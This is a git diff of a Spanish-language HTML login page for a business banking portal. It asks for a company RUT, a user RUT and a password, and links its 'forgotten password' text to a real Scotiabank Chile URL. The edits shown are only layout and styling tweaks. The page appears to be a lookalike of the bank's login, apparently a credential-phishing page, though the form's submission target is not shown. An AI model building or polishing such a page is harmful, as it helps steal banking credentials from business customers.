@@ -15,7 +15,7 @@
       box-shadow: 0 2px 5px rgba(0,0,0,0.2);
     }
     .top-bar img {
-      height: 30px;
+      height: 40px;
     }
     .form-card {
       background: #fff;
@@ -38,13 +38,6 @@
     .extra-link a:hover {
       text-decoration: underline;
     }
-     /* ✅ Ajuste de la imagen para escritorio */
-  @media (min-width: 768px) {
-    .aviso-img {
-      max-width: 70%;  /* ajusta porcentaje según lo que quieras */
-      height: auto;
-    }
-  }
   </style>
 </head>
 <body>
@@ -64,41 +57,39 @@
 
   <!-- Contenido principal -->
   <div class="container mt-5 pt-5">
-    <div class="row align-items-start">
+    <div class="row align-items-center">
       <!-- Formulario -->
       <div class="col-12 col-md-6 mb-4">
         <div class="form-card">
           <h2 class="text-center fw-bold mb-2">Bienvenido a su Portal Empresa</h2>
           <p class="text-center mb-4">Acceda al portal ingresando sus datos</p>
-         <!-- Formulario -->
-<form id="loginForm">
-  <div class="mb-3">
-    <label for="rutEmpresa" class="form-label">RUT Empresa</label>
-    <input type="text" class="form-control" id="rutEmpresa" name="rutEmpresa" placeholder="12.345.678-9" required>
-  </div>
-  <div class="mb-3">
-    <label for="rutPersona" class="form-label">RUT Usuario</label>
-    <input type="text" class="form-control" id="rutPersona" name="rutPersona" placeholder="98.765.432-1" required>
-  </div>
-  <div class="mb-3">
-    <label for="passwd" class="form-label">Clave</label>
-    <input type="password" class="form-control" id="passwd" name="passwd" placeholder="********" required>
-  </div>
-  <button type="submit" class="btn btn-primary w-100">Ingresar</button>
-</form>
-
-<div class="extra-link text-center mt-3">
-  <a href="https://banco.scotiabank.cl/mfe-login/scotia?c=-Jm7twBoTk8r5JxsG9yQxvyBzYuj9zPzbqKzZGvVa5vWeXygMBZdA_6hy2MsHa_iNlH3e119igob0K7rFv4Y78Ed8U06fo1G887umLNUOM4#modal-recovery" target="_blank">
-    Olvidó su clave / No tiene clave?
-  </a>
-</div>
-
-<div class="message text-center mt-2" id="message"></div>
+          <form id="loginForm">
+            <div class="mb-3">
+              <label for="rutEmpresa" class="form-label">RUT Empresa</label>
+              <input type="text" class="form-control" id="rutEmpresa" name="rutEmpresa" placeholder="12.345.678-9" required>
+            </div>
+            <div class="mb-3">
+              <label for="rutPersona" class="form-label">RUT Usuario</label>
+              <input type="text" class="form-control" id="rutPersona" name="rutPersona" placeholder="98.765.432-1" required>
+            </div>
+            <div class="mb-3">
+              <label for="passwd" class="form-label">Clave</label>
+              <input type="password" class="form-control" id="passwd" name="passwd" placeholder="********" required>
+            </div>
+            <button type="submit" class="btn btn-primary w-100">Ingresar</button>
+          </form>
+          <div class="extra-link text-center mt-3">
+            <a href="https://banco.scotiabank.cl/mfe-login/scotia?c=-Jm7twBoTk8r5JxsG9yQxvyBzYuj9zPzbqKzZGvVa5vWeXygMBZdA_6hy2MsHa_iNlH3e119igob0K7rFv4Y78Ed8U06fo1G887umLNUOM4#modal-recovery" target="_blank">
+              Olvidó su clave / No tiene clave?
+            </a>
+          </div>
+          <div class="message text-center mt-2" id="message"></div>
+        </div>
       </div>
 
       <!-- Imagen -->
       <div class="col-12 col-md-6 text-center">
-        <img src="aviso-ggee.jpg" alt="Aviso Empresa" class="img-fluid rounded shadow aviso-img">
+        <img src="aviso-ggee.jpg" alt="Aviso Empresa" class="img-fluid rounded shadow">
       </div>
     </div>
   </div>
